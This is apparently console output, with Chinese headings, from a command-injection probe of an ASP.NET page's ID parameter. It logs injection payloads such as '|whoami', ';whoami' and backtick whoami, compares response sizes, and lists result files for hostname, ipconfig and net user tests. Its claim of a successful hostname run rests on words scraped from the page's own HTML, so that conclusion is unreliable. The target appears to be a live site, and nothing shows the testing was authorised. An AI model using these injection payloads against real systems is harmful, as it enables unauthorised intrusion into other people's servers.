@@ -1,0 +1,109 @@
+🔥 验证命令注入 - 详细分析
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] 基线请求 (正常ID)...
+  基线大小: 4205 bytes
+
+[2] 测试: ID=|whoami
+  响应大小: 4409 bytes
+  差异: 204 bytes
+  ⚠️  可能有响应，但未明确
+    <form method="post" action="./inBCC.aspx?ID=%7cwhoami" id="form1">
+
+[3] 测试: ID=;whoami
+  响应大小: 4409 bytes
+  差异: 204 bytes
+
+[4] 测试: ID=`whoami`
+  响应大小: 4416 bytes
+  差异: 211 bytes
+
+[5] 测试其他命令...
+  ✅ hostname 成功: DOCTYPE
+PUBLIC
+W3C
+DTD
+XHTML
+DTD
+1999
+158
+BCC
+MAU2
+VIEWSTATE
+VIEWSTATE
+EPD
+ULLTE4M
+OTE
+ODUPZBYCA
+MPZBYQA
+EPD
+YCH
+RUZX
+0ZWR
+MPD
+YCH
+AFDU1BVTJ8
+ZAIPD
+APF
+B0V
+YWJ
+ZWR
+ZGQWAGQCE
+8QD
+YCH
+ZGQWAGQCF
+8QD
+YCH
+ZGQWAGQCGQ8PF
+ZAI
+8WA
+0PD
+YCH
+AFM0
+IMSR4
+JHG
+OG7
+4N1IGP
+2XOE
+FXW2
+91NXPT
+VIEWSTATEGENERATOR
+VIEWSTATEGENERATOR
+1C7806B8
+EVENTVALIDATION
+EVENTVALIDATION
+AAV
+M4B
+6XD9
+28V
+P5O2
+U5U
+AS9
+8PV
+R1B
+TTB
+FUB
+100
+BORDER-BOTTOM
+FF0066
+FF0066
+BÁO
+BIỂU
+600
+379
+2025
+FONT-SIZE
+FONT-FAMILY
+FONT-SIZE
+FONT-FAMILY
+FF3300
+FF3300
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 结果文件:
+-rw-r--r-- 1 ubuntu ubuntu 4.2K Nov 17 16:20 baseline_cmd.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_backtick_whoami.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_hostname.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_ipconfig.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_netuser.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_pipe_whoami.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:20 test_semi_whoami.html
